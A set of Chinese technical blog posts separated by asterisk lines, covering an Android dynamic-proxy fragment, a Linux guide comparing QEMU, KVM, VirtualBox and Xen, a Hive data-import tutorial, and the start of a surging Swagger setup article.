            String methodName = method.getName();
            // 3. 根据服务信息发起请求，返回调用结果
            return Request.request(serviceName, versionName, groupName, methodName, param);
        }
    });
}
在HTTP网关得到服务名称、服务方法、服务版本、服务分组等信息之后，即可实现对后端服务的反射调用。总的来讲，即可实现Android端dubbo:reference化的网络访问。
// 调用ClassTestService服务的方法
classTestService.echo("yhthu").callback(// ……);

上述代码实现均为伪代码，仅说明解决方案思路。

在该案例中，综合使用了自定义注解、反射以及动态代理，是对上述理论知识的一个具体应用。

********************************************************************************************************************************************************************************************************
Linux 桌面玩家指南：07. Linux 中的 Qemu、KVM、VirtualBox、Xen 虚拟机体验

特别说明：要在我的随笔后写评论的小伙伴们请注意了，我的博客开启了 MathJax 数学公式支持，MathJax 使用$标记数学公式的开始和结束。如果某条评论中出现了两个$，MathJax 会将两个$之间的内容按照数学公式进行排版，从而导致评论区格式混乱。如果大家的评论中用到了$，但是又不是为了使用数学公式，就请使用\$转义一下，谢谢。

想从头阅读该系列吗？下面是传送门：

Linux 桌面玩家指南：01. 玩转 Linux 系统的方法论 【约 1.1 万字，22 张图片】
Linux 桌面玩家指南：02. 以最简洁的方式打造实用的 Vim 环境 【约 0.97 万字，7 张图片】
Linux 桌面玩家指南：03. 针对 Gnome 3 的 Linux 桌面进行美化 【约 0.58 万字，32 张图片】
Linux 桌面玩家指南：04. Linux 桌面系统字体配置要略 【约 1.2 万字，34 张图片】
Linux 桌面玩家指南：05. 发博客必备的图片处理和视频录制神器 【约 0.25 万字，14 张图片】
Linux 桌面玩家指南：06. 优雅地使用命令行及 Bash 脚本编程语言中的美学与哲学 【约 1.4 万字，16 张图片】

前言
是时候聊一下虚拟机了，因为我后面即将聊的 Linux 玩法，包括硬盘分区以及在同一块硬盘上安装多个 Linux 发行版、在 X86 的实模式下运行 16 位的程序、探索 Grub 和 Linux 纯字符模式等等，要截图和录像的话，必须借助于虚拟机。
说起虚拟机，大家都不陌生。需要使用虚拟机的场景也非常的多，对于有志于写操作系统的同志，往往需要一个虚拟机来运行和调试他写的系统；对于喜欢研究网络体系结构的朋友，往往需要在自己的电脑上虚拟出 N 个系统组成各种各样的网络。（这个需要电脑的配置够强大才行，幸好本人的电脑够。）还有些朋友用着 Windows 却想玩 Linux，用着 Linux 却想玩 Windows，这样用虚拟机玩起来也比较方便；最后对于在 Linux 环境下解决起来比较困难的一些需求，如迅雷、QQ、网银、支付宝等，使用虚拟机安装一个 Windows 系统，也可以非常轻松地搞定。我自己也经常在 Windows 中用 VMWare，感觉它功能强大、使用方便，运行效率也非常高。我的博客中有不少内容都是在虚拟机中折腾出来的。在 Linux 系统下，我也用虚拟机，这一篇随笔就向大家展示一下 Linux 中的几种常见的虚拟机软件。
虚拟机的分类很复杂。什么全虚拟、半虚拟什么的搞得人头晕。而且桌面用户和企业级用户对虚拟机的期望值是不一样的。比如说，我可能期望这样一个虚拟机：
1.它能模拟出一台完整的个人电脑，我可以给它安装任何我想安装的操作系统；
2.它要有比较好用的图形界面，模拟出的电脑也要能无障碍运行 Windows 或 Gnome 这样的图形系统，能打游戏最好；
3.客户操作系统所用的硬盘就是宿主操作系统中的一个镜像文件，随时可复制粘贴，随时可打包带走；
4.最好能模拟出一些本身不存在的硬件，像多个网卡什么的。
很显然，VMWare Workstation 就是这样一个可以完美满足我要求的桌面用户最满意的虚拟机。我经常使用它来折腾各个 Linux 发行版，而且运行流畅。当然，在 Linux 这个开源的世界我们是不该去使用破解版这样的东西的。不过不用担心，在 Linux 江湖中，还有 VirtualBox、QEMU 这样的虚拟机软件可用。
而企业级用户呢，他们期望的虚拟机可能是这样的：
1.它不一定要能模拟出一台完整的电脑，重点是 CPU、内存、磁盘和网卡，重点是能当服务器使用；
2.它性能一定要好，虚拟的 CPU 性能一定要接近物理 CPU，一定要充分利用物理 CPU 的所有特性，为了性能，甚至只能安装经过修改过内核的操作系统；（所谓的半虚拟化技术。）
3.它隔离性一定要好，它的目的是把一台机器分成 N 台机器用，而管理这 N 台虚拟机的宿主机要越不占用资源越好，客户机是主，宿主机是次；（正如 Xen 这样。）
4.由于企业级用户对性能的追求，所以客户机所用的硬盘可能真是一个独立的物理硬盘、磁盘阵列、网络文件系统什么的，而不仅仅只是宿主机上的一个镜像文件；
5.它不一定需要有图形界面，因为使用命令行更容易管理，像自动化啊、远程化啊、批量化啊什么的；
6.更多的企业级高可用性需求，像什么热备份啊、动态迁移啊等等。
从上面这些期望值可以看出，虚拟机领域水很深，市场前景也很广阔。各个虚拟机厂家把自家产品吹得天花乱坠那也是很常见的，因为每一个用户期望的点都可以大做文章嘛。所谓临渊羡鱼，不如退而结网，各种虚拟机看得再过瘾，也不如自己尝试一下。
能模拟不同硬件架构的虚拟机 —— QEMU
还是老规矩，先给出参考资料，它的学习资料还在这里： QEMU 的官方文档。
或者，在自己的系统中输入如下命令查看手册页：
man qemu-system-i386
man qemu-img
等等...
QEMU 本身是一个非常强大的虚拟机，甚至在 Xen、KVM 这些虚拟机产品中都少不了 QEMU 的身影。在 QEMU 的官方文档中也提到，QEMU 可以利用 Xen、KVM 等技术来加速。为什么需要加速呢，那是因为如果单纯使用 QEMU 的时候，它里面的 CPU 等硬件都是模拟出来的，也就是全虚拟化，所以运行速度是肯定赶不上物理硬件的。它甚至可以模拟不同架构的硬件，比如说在使用 Intel X86 的 CPU 的电脑中模拟出一个 ARM 体系的电脑或 MIPS 体系的电脑，这样模拟出的 CPU，运行速度更加不可能赶上物理 CPU。使用加速以后呢，可以把客户操作系统的 CPU 指令直接转发到物理 CPU，自然运行效率大增。
QEMU 同时也是一个非常简单的虚拟机，给它一个硬盘镜像就可以启动一个虚拟机，如果想定制这个虚拟机的配置，用什么样的 CPU 啊、什么样的显卡啊、什么样的网络配置啊，只需要指定相应的命令行参数就可以了。它支持许多格式的磁盘镜像，包括 VirtualBox 创建的磁盘镜像文件。它同时也提供一个创建和管理磁盘镜像的工具 qemu-img。QEMU 及其工具所使用的命令行参数，直接查看其文档即可。
下面开始体验。先看看 Ubuntu 软件源中和 QEMU 有关的包有哪些：


我的电脑是 Intel 的 CPU，而我想虚拟的也是个人电脑，所以我安装的自然是 qemu-system-x86，另外一个有用的是 qemu-utils。查看 QEMU 软件包中的工具及文档：

使用 qemu-img 创建磁盘映像文件，使用 qemu-system-i386 启动虚拟机，并安装操作系统：

WinXP 估计是目前全网络上最好下载的操作系统了。运行以上命令后，弹出熟悉的系统安装界面。安装过程我就不啰嗦了。下图是安装完 WinXP 操作系统之后的效果。可以给 qemu-system-i386 指定更多的参数，在再一次启动 WinXP 的时候，我除了给它分配了 2G 内存，我还使用 -smp 2 参数为它分配了两个 CPU，还使用 -vga vmware 为它指定和 VMWare 虚拟显卡一样的显卡。虽然指定两个 CPU，但是性能仍较差。随便拖动一下窗口 CPU 使用率就飙升到 100%。

而且从上图中可以看到，虚拟机中的 CPU 虽然显示为 3.5GHz，但是很显然是 QEMU 模拟出来的，和物理 CPU 有显著差别。事实上我的电脑配置相当强悍，Core i7-4770K 的四核八线程 CPU，请看 lshw 的输出结果：

Intel Core i7-4770K 的 CPU，虚拟出的 XP 也分配了 2G 的内存和两个 CPU，但是流畅度仍较差。说明单纯使用 QEMU 还是不能满足我们桌面用户的需要。配合Xen 或者 KVM 呢？性能是否会有质的飞跃呢？
被加入 Linux 内核的虚拟机 —— KVM
上一节展示的 QEMU 是一个强大的虚拟机软件，它可以完全以软件的形式模拟出一台完整的电脑所需的所有硬件，甚至是模拟出不同架构的硬件，在这些虚拟的硬件之上，可以安装完整的操作系统。QEMU 的运行模式如下图：

很显然，这种完全以软件模拟硬件的形式虽然功能强大，但是性能难以满足用户的需要。模拟出的硬件的性能和物理硬件的性能相比，必然会大打折扣。为了提高虚拟机软件的性能，开发者们各显神通。其中，最常用的办法就是在主操作系统中通过内核模块开一个洞，通过这个洞将虚拟机中的操作直接映射到物理硬件上，从而提高虚拟机中运行的操作系统的性能。如下图：

其中 KVM 就是这种加速模式的典型代表。在社区中，大家常把 KVM 和 Xen 相提并论，但是它们其实完全不一样。从上图可以看出，使用内核模块加速这种模式，主操作系统仍然占主导地位，内核模块只是在主操作系统中开一个洞，用来连接虚拟机和物理硬件，给虚拟机加速，但是虚拟机中的客户操作系统仍然受到很大的限制。这种模式比较适合桌面用户使用，主操作系统仍然是他们的主战场，不管是办公还是打游戏，都通过主操作系统完成，客户操作系统只是按需使用。至于 Xen，则完全使用不同的理念，比较适合企业级用户使用，桌面用户就不要轻易去碰了，具体内容我后面再讲。
其实 VirtualBox 也是采取的这种内核模块加速的模式。我之所以这么说，是因为在安装 VirtualBox 时，它会要求安装 DKMS。如下图：

熟悉 Linux 的人知道，DKMS 就是为了方便用户管理内核模块而存在的，不熟悉 DKMS 的人 Google 一下也可以了解个大概。关于 VirtualBox 的具体使用方面的内容，我下一节再讲。这一篇主要讲 KVM。
KVM 和 QEMU 是相辅相成的，QEMU 可以使用 KVM 内核模块加速，而 KVM 需要使用 QEMU 运行虚拟机。从上图可以看到，如果要使用 Ubuntu 的包管理软件安装 KVM，其实安装的就是 qemu-kvm。而 qemu-kvm 并不是一个什么很复杂的软件包，它只包含很少量几个文件，如下图：

用 man 命令查看一下它的文档，发现 qemu-kvm 包不仅包含的文件很少，而且它的可执行文件 kvm 也只是对 qemu-system-x86_64 命令的一个简单包装，如下图：

那么问题来了，kvm 内核模块究竟是由哪个包提供的呢？其实，自从 Linux 2.6 开始，kvm 就已经被加入内核了。如果非要找出 kvm 内核模块 kvm.ko 是由哪个包提供的，可以用如下命令考察一下：

写到这里，已经可以看出 KVM 的使用是很简单的了。下面，我使用 KVM 运行一下上一篇中安装的 WinXP 操作系统，体验一下 QEMU 经过 KVM 加速后的运行效率。使用如下命令运行使用 KVM 加速的 QEMU：

可以看出，使用 KVM 加速后，虚拟机中的 WinXP 运行速度提升了不少，开机只用了 34 秒。我将分辨率调整为 1366*768，图形界面运行也很流畅，不管是打开 IE 浏览器还是 Office 办公软件都没有问题，再也没有出现 CPU 使用率飙升到 100% 的情况。如果用 ps -ef | grep qemu 命令查看一下，发现 kvm 命令运行的还是 qemu-system-x86_64 程序，只不过加上了 -enable-kvm 参数，如下图：

另外，对于桌面用户来说，有一个好用的图形化界面也是很重要的。虽然 QEMU 和 KVM 自身不带图形界面的虚拟机管理器，但是我们可以使用第 3 方软件，比如 virt-manager。只需要使用 sudo apt-get install virt-manager 即可安装该软件。该软件依赖于 libvirt，在安装过程中也会自动安装。运行 virt-manager 的效果如下图，注意必须使用 sudo 运行，因为该软件需要超级用户权限：

该软件可自动识别系统中的虚拟机环境是 QEMU+KVM 还是 Xen。新建一个虚拟机，由于之前安装过一个 WinXP 系统，所以选择导入现有硬盘镜像。点下一步后，出现如下界面：

这一步没什么好说的，再点下一步，如下图：

这里可以设置网络选项。如果勾选“在安装前自定义配置”的话，还可以对硬件进行进一步的自定义，如下图：

在上图中，我们可以看到虚拟机支持的所有虚拟显卡的类型，在这里，我当然选择的是 VMVGA，因为我以前经常用 VMWare，知道这些操作系统在 VMWare 的虚拟显卡设置下运行得都没有问题。当然，其它的选项都可以试一下，不过在虚拟的操作系统中需要安装相应的驱动程序。
最后，虚拟机运行的效果图如下：

可以看到，该程序提供的界面有非常丰富的功能菜单，功能是非常强大的，甚至可以向虚拟机中的操作系统发送组合按键。
可以这么说，如果没有 VirtualBox 的话，QEMU+KVM 的组合应该是桌面用户的首选。
VirtualBox —— 性能强大的经典架构
VirtualBox 号称是目前开源界最强大的虚拟机产品，在 Linux 平台上，基本上都被大家选择为首选的虚拟机软件。VirtualBox 的强大不是盖的，毕竟其后台是超有钱的 Oracle 公司。VirtualBox 的任性也不是盖的，它硬是没有使用我前文所述的那些 qemu、kvm、libvirt 等被各个虚拟机使用的开源组件，它的前端、后端以及内核加速模块都是自己开发的，唯有远程桌面所需要的 VNC 大约使用了 libvncserver。
我在标题中说到 VirutalBox 是使用的经典架构。所谓经典，主要体现在以下几个方面：
1.虚拟机及虚拟机中的系统（Guest System）仍运行于主操作系统（Host System）之上，只是通过主操作系统的内核模块进行加速；
2.Unix 系统中 Front-End 模式的经典架构，在 VirtualBox 中，VirtualBox 的图形界面只不过是命令行界面的虚拟机软件 VBoxManage 的图形包装而已，同时，它还提供 VBoxSDL、VBoxHeadless 等命令行工具。VBoxHeadless 就可以运行一个不显示虚拟机桌面的虚拟机，如果要显示桌面，可以运行一个远程桌面连接它。前后端分离有一个好处，就是对于桌面用户，可以使用前端的图形界面简化操作，而对于企业级用户，可以使用命令行工具构建自动化脚本，甚至在系统启动时自动运行虚拟机。
我并不是一开始就喜欢上 VirtualBox 的，一点小小的插曲差点就让我错过了这么好的虚拟机软件。本来我刚开始看到在各个 Linux 论坛都将 VirtualBox 放到首位，而不是在新闻中铺天盖地的 KVM、Xen，我就觉得 VirutalBox 可能有点不够专业，再加上第一次使用 VirtualBox 时，发现它不能完美转发 Ctrl+Alt+Fx（x=1～12），发现它的有些配置不能完全在图形界面中设置，需要手动更改配置文件，然后我就放弃了。直到我掌握的正确的折腾 Linux 的方法论，看完了它长达 369 页的用户手册，我才真正了解了它的强大，并深深爱上了它。VirtualBox 把右边的 Ctrl 定义为 Host 键，要向客户机发送 Ctrl+Alt+Fx，只需要按 Host+Fx 就行了。
首先，在 Ubuntu 中安装 VirutalBox 是非常容易的，只需要一个 sudo apt-get install virtualbox 即可。
安装完 VirtualBox 后，可以考察一下它所遵守的我之前提到的“经典架构”，命令和运行结果如下图：

lsmod 命令可以看到 VirtualBox 安装后，在主操作系统中安装了好几个内核模块，用来对虚拟机进行加速。至于使用内核模块对虚拟机加速的图片我这里就不再贴了，请大家参考我的上一篇。通过 dpkg -L 命令可以考察 VirtualBox 提供了哪些命令行工具。最后，通过 dpkg -S 命令可以看到，VirtualBox这个可执行程序其实是属于 virtualbox-qt 软件包的，它只是一个图形界面的封装。
启动 VirtualBox，新建虚拟机和安装操作系统的过程我就不多说了，图形界面很强大，一步一步执行准没错。安装完 WinXP 后，运行效果如下图：

从该图中可以看出，WinXP 系统认出的 CPU 是准确的 Intel Core i7-4770K，虽然我只给它分配了两个核心。但是显卡不能准确识别。之所以是这样，是因为 WinXP 系统中没有相应的驱动，所以，需要安装 VirtualBox 的客户系统增强工具。在菜单栏选择安装增强功能，如下图：

然后 VirtualBox 就会给 WinXP 安装一个虚拟光盘，双击该光盘，就可以在 WinXP 系统中安装客户系统增强工具，如下图：

客户系统增强工具是安装在 Guest System 中的，可以认为客户系统增强工具主要是包含了客户操作系统中所需要驱动，因为没有这些驱动，客户操作系统可能无法认识那些虚拟出来的硬件，比如虚拟显卡什么的。当然，客户系统增强工具的功能远远不止这些，比如显卡 3D 加速啊、主操作系统和客户操作系统共享文件夹啊什么的，还有一个最牛 B 的，那就是让客户操作系统进入无缝模式。比如安装完用户增强工具后，可以识别出显卡类型，并且有不同的分辨率选项，如下图：

按 Host+L 键，可以键入无缝模式，如下图，可以看到在 Ubuntu 系统中，Ubuntu 风格的窗口和 WinXP 风格的窗口共存：

再玩大一点，使用 IE 浏览器访问博客园，如下图：

由此可见，在 Linux 系统中使用 Windows 的软件进行办公不再是梦，什么网银、什么 QQ，一样毫无障碍。再按 Host+L 键，虚拟机会回到窗口模式。
VirtualBox 功能非常强大，单凭我这一篇博文是不可能学会的。好在是我这一个系列一直都是秉承“授人以鱼不如授人以渔”的原则，一直都是指导折腾 Linux 系统的方法论，并贴图让没有亲自动手机会的人也对 Linux 系统有一个直观的感受，也一直指出从哪里可以找到相应的学习资料。用 dpkg -L 命令，就可以找出我前面提到的 VirtualBox 自带的长达369页的文档，使用 Ubuntu 自带的 evince 阅读器阅读之，如下图：

当然，也可以从官网下载 VirtualBox 官方文档 pdf 版，放到手机上有空的时候慢慢阅读。至于我前面说的 VirtualBox 这不能那不能什么的，完全都是我自己不切实际的瞎说，等你看完它的文档，你就会发现它没有什么是不能的。就 VirtualBox 在我机器上的运行效果看，流畅度要超过前面的 QEMU+KVM组合，图形性能也要更加强大。它的文档中还有更多更高级的玩法，仔细阅读吧，精通命令行和配置文件不是梦，而且 VirtualBox 并不仅仅适用于桌面用户，对于企业级的应用，它也是可以的。
Xen —— 令人脑洞大开的奇异架构
在虚拟机领域，Xen 具有非常高的知名度，其名字经常在各类文章中出现。同时 Xen 也具有非常高的难度，别说玩转，就算仅仅只是理解它，都不是那么容易。之所以如此，那是因为 Xen 采用了和我前面介绍的那几个虚拟机完全不同的架构。在这里，我称之为令人脑洞大开的奇异架构。
在经典的虚拟机架构中，虚拟机软件运行于 Host System 之中，而 Guest System 运行于虚拟机软件之中。为了提高 Guest System 的运行速度，虚拟机软件一般会在 Host System 中使用内核模块开一个洞，将 Guest System 的运行指令直接映射到物理硬件上。但是在 Xen 中，则根本没有 Host System 的概念，传说它所有的虚拟机都直接运行于硬件之上，虚拟机运行的效率非常的高，虚拟机之间的隔离性非常的好。
当然，传说只是传说。我刚开始也是很纳闷，怎么可能让所有的虚拟机都直接运行于硬件之上。后来我终于知道，这只是一个噱头。虚拟机和硬件之间，还是有一个管理层的，那就是 Xen Hypervisor，只不过这个管理层可以做得相当薄。当然 Xen Hypervisor 的功能毕竟是有限的，怎么样它也比不上一个操作系统，因此，在 Xen Hypervisor 上运行的虚拟机中，有一个虚拟机是具有特权的，它称之为 Domain 0，而其它的虚拟机都称之为 Domain U。
Xen的架构如下图：

从图中可以看出，Xen 虚拟机架构中没有 Host System，在硬件层之上是薄薄的一层 Xen Hypervisor，在这之上就是各个虚拟机了，没有 Host System，只有 Domain 0，而 Guest System 都是 Domain U，不管是 Domain 0 还是 Domain U，都是虚拟机，都是被虚拟机软件管理的对象。
既然 Domain 0 也是一个虚拟机，也是被管理的对象，所以可以给它分配很少的资源，然后将其余的资源公平地分配到其它的 Domain。但是很奇怪的是，所有的虚拟机管理软件其实都是运行在这个 Domain 0 中的。同时，如果要连接到其它 Guest System 的控制台，而又不是使用远程桌面（VNC）的话，这些控制台也是显示在 Domian 0 中的。所以说，这是一个奇异的架构，是一个让人很不容易理解的架构。
这种架构桌面用户不喜欢，因为 Host System 变成了 Domain 0，本来应该掌控所有资源的主操作系统变成了一个受管理的虚拟机，本来用来打游戏、编程、聊天的主战场受到限制了，可能不能完全发挥硬件的性能了，还有可能运行不稳定了，自然会心里不爽。（Domain 0确实不能安装专用显卡驱动，确实会运行不稳定，这个后面会讲。）但是企业级用户喜欢，因为所有的 Domain 都是虚拟机，所以可以更加公平地分配资源，而且由于 Domain U 不再是运行于 Domian 0 里面的软件，而是和 Domain 0 平级的系统，这样即使 Domain 0 崩溃了，也不会影响到正在运行的 Domain U。（真的不会有丝毫影响吗？我表示怀疑。）
下面开始在 Ubuntu 系统中体验 Xen。使用如下命令可以在 Ubuntu 的软件源中搜索和 Xen 相关的软件包以及安装 Xen Hypervisor：
sudo aptitude search xen
sudo aptitude install xen-hypervisor-4.4-amd64
传说在旧版本的 Xen Hypervisor 上只能运行经过修改过的 Linux 内核。但是在目前的版本中不存在该问题。我机器上的 Ubuntu 14.10 系统不经任何修改，就可以当成 Domain 0 中的系统运行。至于是否让该系统运行于 Xen Hypervisor 上，在启动时可以选择，如下图：

通过查看 Grub 的配置文件，可以看到通过 Xen 虚拟机启动 Ubuntu 系统时，Grub 先启动的是 /boot/xen-4.4-amd64.gz，然后才把 Linux 内核以及 initrd 文件作为模块载入内存。也就是说，Grub 启动 Xen Hypervisor，然后 Xen Hypervisor 运行 Domian 0。

前面提到 Host System 一下子变成了 Domain 0 中的操作系统是让桌面用户比较不爽的事，这里详细论述。虽然说目前的 Xen 同时支持全虚拟化和半虚拟化，支持操作系统不经任何修改就运行于 Xen 虚拟机上（全虚拟），但是系统是否稳定还是和内核有很大关系的。比如说我在 Ubuntu 14.04 刚推出的那段时间，在 Ubuntu 14.04 中使用 Xen 是没有什么问题的，但是经过几次系统升级后，Xen 就出问题了，没办法成功进入 Domain 0 中的 Ubuntu 14.04。现在我用的是 Ubuntu 14.10，已经升过好几次级了，目前使用Xen还是很稳定的。其次就是显卡驱动的问题，我的 Ubuntu 当主系统用时，使用的是 NVIDIA 的显卡驱动，但是当 Ubuntu 运行于 Domain 0 中时，就不能使用 NVIDIA 的显卡驱动了，否则无法进入图形界面。
下面来测试一下 Xen 虚拟机的运行效果。通过前文的探讨，可以看出一个虚拟机的运行需要两个要素：一是一套虚拟的硬件系统，二是一个包含了操作系统的磁盘镜像。QEMU 虚拟机关于硬件的配置全由命令行指定，VirtualBox 虚拟机的硬件配置存在于配置文件中，而 Xen 呢，它也存在于配置文件中，这个配置文件要我们自己写。至于磁盘镜像，还是复用我之前创建的那个 WinXP.img 吧，记住，它是 qcow2 格式的。
先进入我主目录的 virtual-os 目录，ls 看一下，里面有我之前创建的 WinXP.img。然后，我们创建一个 WinXP_Xen.hvm 配置文件，其内容如下：
builder = "hvm"
name = "WinXP_Xen.hvm"
memory = 2048
vcpus = 2
disk = [ '/home/youxia/virtual-os/WinXP.img, qcow2, hda, rw' ]
sdl = 1
这段配置文件很简单，也很容易懂。 hvm 代表这是一个全虚拟化的虚拟机，和全虚拟化相对的是半虚拟化，半虚拟化只能运行经过修改的内核，但是可以获得更高的性能。为该虚拟机分配 2 个 CPU 和 2G 内存，并指定硬盘镜像文件。最后一个 sdl=1 表示使用 SDL 图形库显示虚拟操作系统的界面，如果不想用 SDL，也可以写成 vnc=1，这样需要使用 vncviewer 才能连接到虚拟机操作系统的桌面。
至于 Xen 的配置文件怎么写，管理命令怎么用，这个必须得有学习资料。通过 man xl 和 man xl.cfg 查看手册页是可以的，但是最全面的资料还是在 Xen 的官网 上。
使用 sudo xl list 命令可以看到系统中只有一个Domain 0在运行，然后使用 sudo xl create -c WinXP_Xen.hvm 即可运行一个 Domian U 虚拟机，该虚拟机使用 WinXP_Xen.hvm 配置文件。 xl 命令的 -c 选项表示把 Domain U 的控制台显示在 Domain 0 中，如果不用 -c 选项而使用 -V 选项，则创建虚拟机后使用 vncviewer 进行连接。新建的虚拟机运行起来后，再次使用 sudo xl list 命令，可以看到除了Domain 0，还多了一个名称为“WinXP_Xen.hvm”的虚拟机。运行效果如下图：

关于 Xen 更多更高级的功能，比如动态迁移什么的，我这里就不试了。至于说到 Xen 虚拟机的隔离性，如果一个 Domain U 崩溃了，肯定是不会影响到 Domain 0和其它 Domain U 的，但是如果 Domain 0 崩溃了，Domain U 真的不会受到任何影响吗？Domain 0 崩溃了怎么重启它呢？这都是我没想明白的问题。在折腾 Xen 的过程中，我曾多次重启过机器，重启后一看，WinXP_Xen.hvm 还在继续运行，似乎是没有受到 Domain 0 的影响，但是我就想，我机器都重启了，电源都断了，Domain U 它真的能丝毫不受影响吗？
我觉得，Xen 虚拟机不应该是桌面用户的首选，因为它架构比较奇异不容易理解，可能因内核升级而出现不稳定，不能充分发挥桌面硬件的性能，如不能使用 Nvidia 的显卡；桌面用户还是应该首选 VirtualBox。企业及客户可以考虑 Xen，因为它可以提供较好的性能和隔离性，企业级用户不需要桌面用户那么多的功能，所以可以把 Domain 0 做到很薄，可以完全不要图形界面，也不用经常升级内核，甚至可以选择一个经过修改优化的内核，这样就可以在一套硬件上运行尽可能多的虚拟机。
关于 Linux 下虚拟机相关的内容，就写到这里吧。欢迎大家批评指正。
求打赏
我对这次写的这个系列要求是非常高的：首先内容要有意义、够充实，信息量要足够丰富；其次是每一个知识点要讲透彻，不能模棱两可含糊不清；最后是包含丰富的截图，让那些不想装 Linux 系统的朋友们也可以领略到 Linux 桌面的风采。如果我的努力得到大家的认可，可以扫下面的二维码打赏一下：

版权申明
该随笔由京山游侠在2018年10月08日发布于博客园，引用请注明出处，转载或出版请联系博主。QQ邮箱：1841079@qq.com

********************************************************************************************************************************************************************************************************
一起学Hive——详解四种导入数据的方式
在使用Hive的过程中，导入数据是必不可少的步骤，不同的数据导入方式效率也不一样，本文总结Hive四种不同的数据导入方式：

从本地文件系统导入数据
从HDFS中导入数据
从其他的Hive表中导入数据
创建表的同时导入数据

使用导入数据时，会使用到into和overwrite into两个关键字，into是在当前表追加数据，而overwrite into是删除当前表的数据然后在导入数据。
从本地系统导入数据
在Hive中创建load_data_local表，该表中有两个字段，一个是name一个是age。创建表的SQL语句如下:
create table if not exists load_data_local(name string,age int)  
row format delimited fields terminated by ' '  
lines terminated by '\n';
在本地文件系统中创建一个load_data_local.txt的文件，然后往里面写入数据，数据之间用空格分隔。数据为：
zhangsan 30
lisi 50
wangwu 60
peiqi 6
执行load data local inpath '/home/hadoop/hive_test/load_data_local.txt' into table load_data_local;命令，即可将本地系统中的文件的数据导入到Hive表中。
在使用从本地系统导入数据大Hive表中时，文件的路径必须使用绝对路径。
有两种方式验证数据是否导入成功，一种是在Hive中执行select * from load_data_local。另外一种是查看hdfs文件系统中的load_data_local目录下面是否有刚刚上传的load_data_local.txt文件，查看命令为：hadoop fs -ls /user/hive/warehouse/bigdata17.db/load_data_local，结果为：
18/10/07 02:37:11 WARN util.NativeCodeLoader: Unable to load native-hadoop library for your platform... using builtin-java classes where applicable
Found 1 items
-rwxr-xr-x   3 root supergroup         38 2018-10-07 02:24 /user/hive/warehouse/bigdata17.db/load_data_local/load_data_local.txt
从HDFS中导入数据
在Hive中创建load_data_hdfs表，表中有两个字段，分别是name和age。创建表的SQL如下：
create table if not exists load_data_hdfs(name string,age int)  
row format delimited fields terminated by ' '  
lines terminated by '\n';
在本地文件系统创建文件load_data_hdfs.txt文件，然后往里面写入数据。
将load_data_hdfs.txt文件上传到HDFS的data目录下面，命令为：hadoop fs -put load_data_hdfs.txt /data
在Hive中执行命令：
load data inpath 'data/load_data_hdfs.txt' into table load_data_hdfs;
即可将数据导入到Hive的load_data_hdfs表中。
从本地系统导入数据和从hdfs文件系统导入数据用的命令都是load data，但是从本地系统导入数据要加local关键字，如果不加则是从hdfs文件系统导入数据。
从hdfs文件系统导入数据成功后，会把hdfs文件系统中的load_data_hdfs.txt文件删除掉。
从其他的Hive表中导入数据
这种方式要求目标表和源表都必须存在。
创建一个要导入数据的目标表，SQL如下：
create table if not exists load_data_local2(name string,age int) 
row format delimited fields terminated by ' '  
lines terminated by '\n';
导入数据的SQL：
insert into table load_data_local2 select * from load_data_local;
这种数据导入方式也适用于分区表和分桶表的情况。本文只介绍导入分区表的情况，导入数据到分区表分为静态分区和动态分区两种方式。
我们先创建一个分区表，SQL如下：
create table if not exists load_data_partition(name string)  
partitioned by(age int)  
row format delimited fields terminated by ' '  
lines terminated by '\n';
将数据导入分区表必须先在Hive中执行下面两句语句：
set hive.exec.dynamic.partition=true;
set hive.exec.dynamic.partition.mode=nonstrict;
静态方式将load_data_local表的数据导入到load_data_partition表的sql语句如下：
insert into table load_data_partition partition(age=25) select name from load_data_local;
这种方式必须显示的指定分区值，如果分区有很多值，则必须执行多条SQL，效率低下。
动态方式将load_data_local表的数据导入到load_data_partition表的sql语句如下：
insert overwrite table load_data_partition partition select name,age from load_data_local;
这种方式要注意目标表的字段必须和select查询语句字段的顺序和类型一致，特别是分区字段的类型要一致，否则会报错。
一张表有两个以上的分区字段，如果同时使用静态分区和动态分区导入数据，静态分区字段必须写在动态分区字段之前。
Hive还支持一条SQL语句中将数据插入多个表的功能，只需将from关键字前置即可：
from load_data_local 
insert overwrite table load_data_partition partition (age)
  select name,age
insert overwrite table load_data_local3 
  select *
上面的sql语句同时插入到表load_data_partition和load_data_local3表中。这种方式非常高效，对于大数据量并且要将数据插入到多个表的情况下，建议用这种方式。
创建表的同时导入数据
这种方式的创建表的表结构来自于select查询语句的查询字段。
创建load_data_local3并将load_data_loaca的数据导入到load_data_local3表中：
create table load_data_local3 as select * from load_data_local;

********************************************************************************************************************************************************************************************************
surging如何使用swagger 组件测试业务模块
1、前言
   微服务架构概念的提出已经有非常长一段时间了，但在近期几年却开始频繁地出现，大家都着手升级成微服务架构，使用着各种技术，大家认为框架有服务治理就是微服务，实现单一协议的服务调用，微服务虽然没有太明确的定义，但是我认为服务应该是一个或者一组相对较小且独立的功能单元，可以自由组合拆分，针对于业务模块的 CRUD 可以注册为服务，而每个服务都是高度自治的，从开发，部署都是独立，而每个服务只做单一功能，利用领域驱动设计去更好的拆分成粒度更小的模块，而框架本身提供了多种协议，如ws,tcp,http,mqtt,rtp,rtcp, 并且有各种功能的中间件，所开发的业务模块，通过框架可以适用于各种业务场景，让开发人员专注于业务开发这才是真正意义上的微服务。
 以上只是谈下微服务，避免一些人走向误区。而这篇文章主要介绍下surging如何使用swagger 组件测试业务模块
surging源码下载
2、如何使用swagger
 
surging 集成了Kestrel组件并且扩展swagger组件，以下介绍下如何使用swagger组件
xml文档文件设置
针对于 swagger 需要生成 schema，那么需要加载接口模块的xml文档文件，可以通过项目-属性-生成-xml文档文件 进行设置，如下图所示

通过以上设置，如果扫描加载业务模块，可以使用dotnet publish -c release 生成模块文件，如下图所示
 
文件配置
使用swagger ，如果使用官方提供的surging 引擎的话，就需要开启Kestrel组件，如以下配置所示

  "Surging": {
    "Ip": "${Surging_Server_IP}|127.0.0.1",
    "WatchInterval": 30,
    "Port": "${Surging_Server_Port}|98",
    "MappingIp": "${Mapping_ip}",
    "MappingPort": "${Mapping_Port}",
    "Token": "true",
    "MaxConcurrentRequests": 20,
    "ExecutionTimeoutInMilliseconds": 30000,
    "Protocol": "${Protocol}|None", //Http、Tcp、None
    "RootPath": "${RootPath}|D:\\userapp",
    "Ports": {
      "HttpPort": "${HttpPort}|280",
      "WSPort": "${WSPort}|96"
    },
    "RequestCacheEnabled": false,
    "Packages": [
      {
        "TypeName": "EnginePartModule",
        "Using": "${UseEngineParts}|DotNettyModule;NLogModule;MessagePackModule;ConsulModule;KestrelHttpModule;WSProtocolModule;EventBusRabbitMQModule;CachingModule;"
      }
    ]
  }

